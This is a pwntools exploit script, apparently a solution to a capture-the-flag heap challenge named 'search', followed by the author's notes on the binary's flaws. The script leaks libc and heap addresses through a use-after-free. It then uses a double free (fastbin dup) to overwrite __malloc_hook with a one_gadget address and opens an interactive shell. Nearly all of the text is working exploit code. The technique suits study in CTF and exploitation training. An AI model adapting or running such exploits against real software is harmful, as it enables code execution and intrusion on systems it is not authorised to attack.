#!/usr/bin/env python3

from pwn import *

exe = ELF("./search")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def index(size, sentence):
    	r.sendline("2")
    	r.sendline(str(size))
    	r.send(sentence)

    def search(size, word, delete = 0):
    	r.sendline("1")
    	r.sendline(str(size))
    	r.send(word)

    	if delete == 0:
    		r.sendline("n")
    	else:
    		r.sendline("y")

    # libc leak and heap addresses
    index(0x80, "A"*8 + " " + "B"*(0x80-9))
    search(0x77, "B"*0x77, 1) # so that we don't malloc(0x8)
    index(0x8, " "*8) # overlap
    search(0x8, " "*8)
    
    r.recvuntil(" "*8)
    r.recvn(1)
    leak = u64(r.recvn(6) + "\x00\x00")
    libc.address = leak - 0x3c4bf8
    log.info("libc base address: {}".format(hex(libc.address)))
    log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook'])))
    one_gadget = libc.address + 0xf1147

    r.recvn(34)
    heap = u64(r.recvn(8)) - 0x1020
    log.info("heap base address: {}".format(hex(heap)))
    

    # fastbin dup
    

    index(0x60, "A"*0x60)
    index(0x68, "B"*8 + " " + "C"*(0x68-9)) # pass first check
    search(0x60, "A"*0x60, 1)
    search(0x68-9, "C"*(0x68-9), 1)

    # pass second check
    search(8, p64(heap+0x1180), 1)

    hook = libc.symbols['__malloc_hook'] - 0x23
    index(0x60, p64(hook) + "\x00"*(0x60-8))
    index(0x60, "A"*0x60)
    index(0x60, "A"*0x60)
    index(0x60, "\x00"*0x13 + p64(one_gadget) + "\x00"*(0x60-0x13-8))
    
    ''''
    index(0x60, "A"*8 + " " + "B"*(0x60-9))
    search(0x8, "A"*8, 1)
	'''

    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
index:
	- mallocs our requested size and reads that amount
	- malloc(0x28) per word
	[0] - ptr to word
	[1] - size of word
	[2] - ptr to sentence
	[3] - size of sentence
	[4] - ptr to the previous word/ sentence

	- last word is stored in global variable IF it exists and isn't just spaces !!!!!! can avoid
	- if only spaces it frees the word chunk BUT not our chunk !!!!!!!!!!

search
	- doesn't clear the ptr !!!!

	smaller word as to not take from binlist!!!!!!!!!!!!!!!!!!

	I will write hook with index()
	I need to make double free in search()
'''